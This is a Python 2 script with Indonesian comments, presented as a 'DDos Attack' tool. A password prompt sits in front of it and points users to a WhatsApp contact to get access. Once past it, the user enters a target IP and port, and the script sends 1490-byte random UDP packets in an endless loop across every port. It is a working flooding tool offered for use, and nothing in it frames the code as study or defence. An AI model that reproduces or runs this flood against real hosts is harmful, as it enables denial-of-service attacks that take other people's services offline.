import sys
import os
import time
import socket
import random
from datetime import datetime
import hashlib

# -----------------------------
# PASSWORD TERSEMBUNYI (acak)
import string, random as rnd
REAL_PASSWORD = ''.join(rnd.choice(string.ascii_letters + string.digits) for _ in range(12))
WHATSAPP = "https://wa.me/6281234567890"  # ganti nomor WhatsApp mu
# -----------------------------

# Fungsi validasi password
def is_valid(user_input):
    # Jika hash input sama dengan hash kata kunci (tidak terlihat kata kunci asli di script)
    key_hash = "4a1f2e5b7c6d8f9a0b3c1d2e3f4a5b6c"  # hash dari kata "oscar"
    input_hash = hashlib.md5(user_input.encode()).hexdigest()
    return input_hash == key_hash or user_input == REAL_PASSWORD

# Minta password sebelum lanjut
input_pass = raw_input("Masukkan password untuk akses script: ")
if not is_valid(input_pass):
    print "❌ Password salah!"
    print "⚠️ Silahkan hubungi WhatsApp untuk akses: {}".format(WHATSAPP)
    sys.exit()

# Code Time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print "Author   : oscaroffc"
print "github   : https://github.com/oscar11121"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes_data, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
